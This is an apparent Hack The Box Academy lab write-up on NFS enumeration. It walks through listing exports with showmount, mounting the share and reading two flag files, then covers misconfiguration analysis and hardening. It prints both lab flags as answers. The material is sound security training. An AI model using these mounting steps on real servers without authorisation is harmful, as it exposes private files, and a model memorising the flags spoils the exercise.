![htb](../assets/htb.png)

# NFS Enumeration Writeup - HTB Academy

**Platform:** Hack The Box Academy <br>
**Target:** 10.129.188.210 (ACADEMY-FOOT-NIX01) <br>
**Author:** dx73r

---

## Introduction

Network File System (NFS) is a distributed file system protocol originally developed by Sun Microsystems. It allows users to access files over a network as if they were stored locally on their own machine. NFS is widely used in Linux and UNIX-based environments and relies on RPC (Remote Procedure Call) services, typically exposed over ports **111** and **2049**.

Due to its trust-based design, misconfigured NFS shares can easily lead to **information disclosure** or even **privilege escalation**, especially when shares are exported without authentication or proper access controls.


## Objective

The objective of this lab was to:

* Enumerate available NFS shares on the target host
* Mount the exposed NFS shares locally
* Extract sensitive files from the exported directories
* Retrieve flags from the `nfs` and `nfsshare` directories


## Service Enumeration

The first step was to identify NFS-related services running on the target system.

### NFS Port Identification

NFS commonly operates on the following ports:

* **TCP/UDP 111** – rpcbind (portmapper)
* **TCP/UDP 2049** – NFS service

These ports confirm the presence of an active NFS service.

## Enumerating NFS Shares

To identify exported NFS directories, the `showmount` utility was used:

```bash
showmount -e 10.129.188.210
```

### Output

```text
Export list for 10.129.188.210:
/var/nfs      10.0.0.0/8
/mnt/nfsshare 10.0.0.0/8
```

This confirmed that **two directories** were publicly exported:

* `/var/nfs`
* `/mnt/nfsshare`


## Mounting the NFS Shares

A local directory was created to mount the remote NFS exports:

```bash
mkdir nfsdd
```

The NFS share was then mounted using the `nolock` option to avoid RPC locking issues:

```bash
sudo mount -t nfs 10.129.188.210:/ ./nfsdd -o nolock
```


## Exploring the Mounted Share

After mounting, the directory structure was enumerated:

```bash
cd nfsdd
tree .
```

### Directory Structure

```text
.
├── mnt
│   └── nfsshare
│       └── flag.txt
└── var
    └── nfs
        └── flag.txt
```

Two separate flags were identified in different exported directories.


## Retrieving Flags

### Flag from `nfsshare`

```bash
cat mnt/nfsshare/flag.txt
```

**Flag:**

```
HTB{8o7435zhtuih7fztdrzuhdhkfjcn7ghi4357ndcthzuc7rtfghu34}
```

---

### Flag from `nfs`

```bash
cat var/nfs/flag.txt
```

**Flag:**

```
HTB{hjglmvtkjhlkfhugi734zthrie7rjmdze}
```


##  Security Misconfiguration Analysis

The NFS server was misconfigured in the following ways:

* Shares were exported to a wide network range (`10.0.0.0/8`)
* No authentication or user validation was required
* Sensitive files were readable by unauthenticated users

Such configurations violate the principle of **least privilege** and can lead to severe security breaches.


## Mitigation & Hardening Recommendations

To secure NFS deployments, the following best practices should be applied:

* Restrict exports to specific trusted IP addresses
* Enable `root_squash` to prevent root-level access
* Avoid `no_root_squash` and `insecure` options
* Use NFSv4 with Kerberos authentication where possible
* Monitor and audit `/etc/exports` regularly

## Conclusion

This lab demonstrated how insecure NFS configurations can be easily abused to gain unauthorized access to sensitive files. Proper enumeration combined with simple mounting techniques was sufficient to retrieve confidential data.

NFS should **only be used in trusted environments** and must always be properly hardened to prevent exploitation.

---

##### A supporter is worth a thousand followers! [Buy Me a Coffee](https://www.buymeacoffee.com/dx73r). If you like this blog, follow me on [GitHub](https://github.com/dx7er) and [LinkedIn](https://www.linkedin.com/in/naqvio7/). 
